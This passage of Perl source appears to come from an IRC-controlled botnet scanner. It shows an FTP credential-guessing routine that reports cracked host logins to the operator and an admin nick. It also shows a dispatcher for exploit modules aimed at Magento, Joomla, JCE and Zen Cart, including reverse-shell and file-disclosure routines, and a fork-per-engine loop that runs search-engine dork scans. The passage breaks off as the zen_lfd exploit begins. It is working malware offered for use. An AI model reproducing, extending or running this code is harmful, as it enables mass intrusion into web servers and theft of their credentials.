					if ($success == 0) {
						&notice("$nick","15,1 [9FTP15] [ 9http://".$host." 15] [".$user.":".$pass."15] 9Success ");
						&notice("$admin","15,1 [9FTP15] [ 9http://".$host." 15] [".$user.":".$pass."15] 9Success ");
						} else {
						&notice("$nick","15,1 [9FTP15] [ 9http://".$host." 15] [".$user.":".$pass."15] 4Denied ");
					}
				}
			} 
		}
	}
}
        for(my $c=0; $c<= $#lines; $c++) {
            $line = $lines[$c];
            $line = $line_temp.$line if ($line_temp);
            $line_temp = '';
            $line =~ s/\r$//;
            unless ($c == $#lines) {

                parse("$line");
            } else {
                if ($#lines == 0) {
                    parse("$line");
                } elsif ($lines[$c] =~ /\r$/) {
                    parse("$line");
                } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
                    parse("$line");
                } else {
                    $line_temp = $line;
                }
            }
        }
    }
}

##################################################################################

sub type() {
my ($chan,$bug,$dork,$engine,$type) = @_;
	if ($type == 1){$type=&shoplift($chan,$bug,$dork,$engine);}
	elsif ($type == 2){$type=&magadmin($chan,$bug,$dork,$engine);}
	elsif ($type == 3){$type=&magsql($chan,$bug,$dork,$engine);}
	elsif ($type == 4){$type=&mageupl($chan,$bug,$dork,$engine);}
	elsif ($type == 6){$type=&jce_exploit($chan,$bug,$dork,$engine);}
	elsif ($type == 7){$type=&revlfd($chan,$bug,$simpan,$dork,$engine);}
	elsif ($type == 8){$type=&revshell($chan,$bug,$simpan,$dork,$engine);}
	elsif ($type == 9){$type=&zen_lfd($chan,$bug,$simpan,$dork,$engine);}
	elsif ($type == 10){$type=&joomla_xpl($chan,$bug,$simpan,$dork,$engine);}
	elsif ($type == 11){$type=&magelfi($chan,$bug,$simpan,$dork,$engine);}
}

##################################################################################

sub se_start() {
my ($chan,$bug,$dork,$engine,$type) = @_;
	if ($engine =~ /jackae/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKAE",$type); } exit; } }
	if ($engine =~ /jackar/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKAR",$type); } exit; } }
	if ($engine =~ /jackat/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKAT",$type); } exit; } }
	if ($engine =~ /jackau/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKAU",$type); } exit; } }
	if ($engine =~ /jackbr/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKBR",$type); } exit; } }
	if ($engine =~ /jackca/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKCA",$type); } exit; } }
	if ($engine =~ /jackcl/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKCL",$type); } exit; } }
	if ($engine =~ /jackcn/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKCN",$type); } exit; } }
	if ($engine =~ /jackcom/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKCoM",$type); } exit; } }
	if ($engine =~ /jackcz/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKCZ",$type); } exit; } }
	if ($engine =~ /jackde/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKDE",$type); } exit; } }
	if ($engine =~ /jackdk/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKDK",$type); } exit; } }
	if ($engine =~ /jackes/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKES",$type); } exit; } }
	if ($engine =~ /jackeu/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKEU",$type); } exit; } }
	if ($engine =~ /jackfr/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKFR",$type); } exit; } }
	if ($engine =~ /jackhu/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKHU",$type); } exit; } }
	if ($engine =~ /jackid/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKID",$type); } exit; } }
	if ($engine =~ /jackil/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKIL",$type); } exit; } }
	if ($engine =~ /jackin/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKIN",$type); } exit; } }
	if ($engine =~ /jackinfo/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKInfO",$type); } exit; } }
	if ($engine =~ /jackir/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKIR",$type); } exit; } }
	if ($engine =~ /jackit/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKIT",$type); } exit; } }
	if ($engine =~ /jackjp/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKJP",$type); } exit; } }
	if ($engine =~ /jackkr/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKKR",$type); } exit; } }
	if ($engine =~ /jackmx/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKMX",$type); } exit; } }
	if ($engine =~ /jackmy/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKMY",$type); } exit; } }
	if ($engine =~ /jacknet/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKNeT",$type); } exit; } }
	if ($engine =~ /jacknl/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKNL",$type); } exit; } }
	if ($engine =~ /jackorg/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKOrG",$type); } exit; } }
	if ($engine =~ /jackph/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKPH",$type); } exit; } }
	if ($engine =~ /jackpl/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKPL",$type); } exit; } }
	if ($engine =~ /jackro/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKRO",$type); } exit; } }
	if ($engine =~ /jackru/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKRU",$type); } exit; } }
	if ($engine =~ /jackth/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKTH",$type); } exit; } }
	if ($engine =~ /jackua/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKUA",$type); } exit; } }
	if ($engine =~ /jackuk/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKUK",$type); } exit; } }
	if ($engine =~ /jackus/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKUS",$type); } exit; } }
	if ($engine =~ /jacksi/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKSI",$type); } exit; } }
	if ($engine =~ /jackbe/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKBE",$type); } exit; } }
	if ($engine =~ /jackbiz/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JacKBIZ",$type); } exit; } }
	if ($engine =~ /google/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLe",$type); } exit; } }
	if ($engine =~ /googleCA/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeCA",$type); } exit; } }
	if ($engine =~ /googleDE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeDE",$type); } exit; } }
	if ($engine =~ /googleUK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeUK",$type); } exit; } }
	if ($engine =~ /googleFR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeFR",$type); } exit; } }
	if ($engine =~ /googleES/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeES",$type); } exit; } }
	if ($engine =~ /googleIT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeIT",$type); } exit; } }
	if ($engine =~ /googleNL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeNL",$type); } exit; } }
	if ($engine =~ /googleBE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeBE",$type); } exit; } }
	if ($engine =~ /googleCH/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeCH",$type); } exit; } }
	if ($engine =~ /googleSE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeSE",$type); } exit; } }
	if ($engine =~ /googleDK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeDK",$type); } exit; } }
	if ($engine =~ /googleNO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeNO",$type); } exit; } }
	if ($engine =~ /googleNZ/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeNZ",$type); } exit; } }
	if ($engine =~ /googleIE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeIE",$type); } exit; } }
	if ($engine =~ /googleBR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeBR",$type); } exit; } }
	if ($engine =~ /googleAR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeAR",$type); } exit; } }
	if ($engine =~ /googleCO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeCO",$type); } exit; } }
	if ($engine =~ /googleCU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeCU",$type); } exit; } }
	if ($engine =~ /googleCL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeCL",$type); } exit; } }
	if ($engine =~ /googleMX/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeMX",$type); } exit; } }
	if ($engine =~ /googleAU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeAU",$type); } exit; } }
	if ($engine =~ /googleRU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeRU",$type); } exit; } }
	if ($engine =~ /googleAT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeAT",$type); } exit; } }
	if ($engine =~ /googlePL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLePL",$type); } exit; } }
	if ($engine =~ /googleIL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeIL",$type); } exit; } }
	if ($engine =~ /googleTR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeTR",$type); } exit; } }
	if ($engine =~ /googleUA/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeUA",$type); } exit; } }
	if ($engine =~ /googleGR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeGR",$type); } exit; } }
	if ($engine =~ /googleJP/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeJP",$type); } exit; } }
	if ($engine =~ /googleCN/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeCN",$type); } exit; } }
	if ($engine =~ /googleMY/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeMY",$type); } exit; } }
	if ($engine =~ /googleTH/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeTH",$type); } exit; } }
	if ($engine =~ /googleIN/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeIN",$type); } exit; } }
	if ($engine =~ /googleKR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeKR",$type); } exit; } }
	if ($engine =~ /googleRO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeRO",$type); } exit; } }
	if ($engine =~ /googleTW/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeTW",$type); } exit; } }
	if ($engine =~ /googleZA/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeZA",$type); } exit; } }
	if ($engine =~ /googlePT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLePT",$type); } exit; } }
	if ($engine =~ /bing/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Bing",$type); } exit; } }
	if ($engine =~ /bingDE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingDE",$type); } exit; } }
	if ($engine =~ /bingUK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingUK",$type); } exit; } }
	if ($engine =~ /bingCA/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingCA",$type); } exit; } }
	if ($engine =~ /bingBR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingBR",$type); } exit; } }
	if ($engine =~ /bingFR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingFR",$type); } exit; } }
	if ($engine =~ /bingES/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingES",$type); } exit; } }
	if ($engine =~ /bingIT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingIT",$type); } exit; } }
	if ($engine =~ /bingBE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingBE",$type); } exit; } }
	if ($engine =~ /bingNL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingNL",$type); } exit; } }
	if ($engine =~ /bingPT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingPT",$type); } exit; } }
	if ($engine =~ /bingNO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingNO",$type); } exit; } }
	if ($engine =~ /bingDK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingDK",$type); } exit; } }
	if ($engine =~ /bingSE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingSE",$type); } exit; } }
	if ($engine =~ /bingCH/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingCH",$type); } exit; } }
	if ($engine =~ /bingNZ/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingNZ",$type); } exit; } }
	if ($engine =~ /bingRU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingRU",$type); } exit; } }
	if ($engine =~ /bingJP/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingJP",$type); } exit; } }
	if ($engine =~ /bingCN/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingCN",$type); } exit; } }
	if ($engine =~ /bingKR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingKR",$type); } exit; } }
	if ($engine =~ /bingMX/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingMX",$type); } exit; } }
	if ($engine =~ /bingAR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingAR",$type); } exit; } }
	if ($engine =~ /bingCL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingCL",$type); } exit; } }
	if ($engine =~ /bingAU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingAU",$type); } exit; } }
	if ($engine =~ /biglobe/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BigLobe",$type); } exit; } }
	if ($engine =~ /walla/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"WaLLa",$type); } exit; } }
	if ($engine =~ /yahoo/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YaHoo",$type); } exit; } }
	if ($engine =~ /yahooCA/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoCA",$type); } exit; } }
	if ($engine =~ /yahooUK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoUK",$type); } exit; } }
	if ($engine =~ /yahooDE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoDE",$type); } exit; } }
	if ($engine =~ /yahooFR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoFR",$type); } exit; } }
	if ($engine =~ /yahooES/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoES",$type); } exit; } }
	if ($engine =~ /yahooIT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoIT",$type); } exit; } }
	if ($engine =~ /yahooHK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoHK",$type); } exit; } }
	if ($engine =~ /yahooID/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoID",$type); } exit; } }
	if ($engine =~ /yahooIN/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoIN",$type); } exit; } }
	if ($engine =~ /yahooAU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoAU",$type); } exit; } }
	if ($engine =~ /yahooMX/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoMX",$type); } exit; } }
	if ($engine =~ /yahooTW/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoTW",$type); } exit; } }
	if ($engine =~ /yahooBR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoBR",$type); } exit; } }
	if ($engine =~ /yahooAR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoAR",$type); } exit; } }
	if ($engine =~ /yahooNL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoNL",$type); } exit; } }
	if ($engine =~ /yahooDK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoDK",$type); } exit; } }
	if ($engine =~ /yahooPH/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoPH",$type); } exit; } }
	if ($engine =~ /yahooCL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoCL",$type); } exit; } }
	if ($engine =~ /yahooRU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoRU",$type); } exit; } }
	if ($engine =~ /yahooCH/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoCH",$type); } exit; } }
	if ($engine =~ /yahooCO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoCO",$type); } exit; } }
	if ($engine =~ /yahooFI/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoFI",$type); } exit; } }
	if ($engine =~ /yahooRO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoRO",$type); } exit; } }
	if ($engine =~ /yahooVE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoVE",$type); } exit; } }
	if ($engine =~ /yahooAT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoAT",$type); } exit; } }
	if ($engine =~ /yahooPL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoPL",$type); } exit; } }
	if ($engine =~ /yahooKR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoKR",$type); } exit; } }
	if ($engine =~ /yahooNZ/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoNZ",$type); } exit; } }
	if ($engine =~ /yahooGR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoGR",$type); } exit; } }
	if ($engine =~ /yahooPE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YahOoPE",$type); } exit; } }
	if ($engine =~ /ask/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsK",$type); } exit; } }
	if ($engine =~ /askCA/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKCA",$type); } exit; } }
	if ($engine =~ /askDE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKDE",$type); } exit; } }
	if ($engine =~ /askIT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKIT",$type); } exit; } }
	if ($engine =~ /askFR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKFR",$type); } exit; } }
	if ($engine =~ /askES/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKES",$type); } exit; } }
	if ($engine =~ /askRU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKRU",$type); } exit; } }
	if ($engine =~ /askNL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKNL",$type); } exit; } }
	if ($engine =~ /askUK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKUK",$type); } exit; } }
	if ($engine =~ /askBR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKBR",$type); } exit; } }
	if ($engine =~ /askPL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKPL",$type); } exit; } }
	if ($engine =~ /askAU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKAU",$type); } exit; } }
	if ($engine =~ /askAT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKAT",$type); } exit; } }
	if ($engine =~ /askJP/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKJP",$type); } exit; } }
	if ($engine =~ /askSE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKSE",$type); } exit; } }
	if ($engine =~ /askMX/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKMX",$type); } exit; } }
	if ($engine =~ /askNO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKNO",$type); } exit; } }
	if ($engine =~ /askDK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKDK",$type); } exit; } }
	if ($engine =~ /uol/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"UoL",$type); } exit; } }
	if ($engine =~ /onet/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"OnEt",$type); } exit; } }
	if ($engine =~ /clusty/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"CLusTy",$type); } exit; } }
	if ($engine =~ /sapo/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"SaPo",$type); } exit; } }
	if ($engine =~ /aol/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AoL",$type); } exit; } }
	if ($engine =~ /lycos/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"LyCos",$type); } exit; } }
	if ($engine =~ /hotbot/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"HotBot",$type); } exit; } }
	if ($engine =~ /seznam/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"SeZNam",$type); } exit; } }
}


###### EXPLOITING #######
##########################
sub zen_lfd() {
	my $chan = $_[0];
	my $bug = $_[1];
	my $simpan = $_[2];
	my $dork = $_[3];
	my $engine = $_[4];
	my $count = 0;
